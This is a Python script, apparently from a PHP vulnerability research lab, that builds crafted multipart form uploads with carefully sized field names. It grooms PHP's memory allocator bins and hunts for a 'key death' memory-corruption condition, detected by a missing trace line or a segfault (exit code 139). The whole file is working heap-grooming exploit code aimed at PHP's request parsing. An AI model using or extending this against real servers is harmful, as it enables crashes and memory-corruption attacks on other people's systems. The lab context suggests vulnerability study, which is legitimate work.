#!/usr/bin/env python3
"""oom35: bin-straddle kill — name 3576 puts tmps in 3584-bin, key (3602B)
in 4096-bin. Per cycle: tmp1,tmp2 recycle (3584), KEY drains 4096, refill
drains 4096 -> 2 drains/cycle -> victim alternates by parity. J flat
3576-char jockey parts = J extra 4096 drains = parity knob.
Detector: keycommit with no following keyok, or RC 139.
usage: oom35.py [jmax]
"""
import re
import sys

exec(open("/tmp/phplab/oom33.py").read().replace('if __name__ == "__main__":', 'if False:'))

NAMELEN = 3576  # tmps 3576+8 -> 3584 bin; key 3576+26=3602 -> 4096 bin


def build_j(j):
    ps = []
    for n in range(j):
        # flat jockey: name 3576 chars -> key 3602 -> 4096-class drain
        head = (b'--BOUND\r\nContent-Disposition: form-data; name="' + b"J" * (NAMELEN - 2) +
                (b"%d" % n) + b'"\r\n\r\n')
        ps.append(head + b"v\r\n")
    base = make_builder(NAMELEN)()
    ps.append(base)
    return b"".join(ps)


def decode_j(j):
    rc, tr = run(build_j(j), LIMIT)
    commits = [(m.start(), m.group(1), m.group(2), m.group(3))
               for m in re.finditer(r"TRACE keycommit stage=(\d+) elem=(\d+) free=(\d+)", tr)]
    ok_positions = [m.start() for m in re.finditer(r"TRACE keyok", tr)]
    last = commits[-1] if commits else None
    key_death = last is not None and not any(p > last[0] for p in ok_positions)
    tried = re.findall(r"tried to allocate (\d+) bytes", tr)
    rcnum = rc.replace("RC=", "")
    if key_death or rcnum == "139":
        i = tr.rfind("TRACE keycommit")
        print("j=%d rc=%s *** KEY DEATH stage=%s elem=%s free=%s tried=%s ***" %
              (j, rcnum, last[1], last[2], last[3], tried[-1] if tried else "-"), flush=True)
        ctx = [l for l in tr[max(0, i - 800):i + 300].splitlines()
               if ("TRACE" in l or "tried" in l or "Allowed" in l)][-16:]
        print("\n".join(ctx))
        print("---")
        return True
    tag = "fatal:" + (tried[-1] if tried else "?") if "Allowed memory" in tr else "survive"
    print("j=%d rc=%s %s commits=%d oks=%d" %
          (j, rcnum, tag, len(commits), len(ok_positions)), flush=True)
    return False


if __name__ == "__main__":
    jmax = int(sys.argv[1]) if len(sys.argv) > 1 else 3
    for j in range(jmax + 1):
        if decode_j(j):
            break
